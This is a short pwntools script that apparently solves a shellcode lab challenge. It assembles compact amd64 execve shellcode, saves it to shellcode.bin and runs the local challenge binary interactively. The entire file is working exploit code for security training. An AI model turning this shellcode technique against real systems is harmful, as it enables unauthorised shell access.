#!/usr/bin/env python3
from pwn import *
from pwn import asm, context, process

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"
context.arch = "amd64"

shellcode = asm(
"""
xor     rsi, rsi
mov     al, 0x3b
cdq
push    0x41
push    rsp
pop     rdi

syscall  
"""
)

with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)

p = process(["./05-short-shellcode-64"], env={'PATH':'/bin:/usr/bin'})
# p = process(['./01-shellcode-32'], env={'PATH':'/bin:/usr/bin'})
# gdb.attach(p)
p.interactive()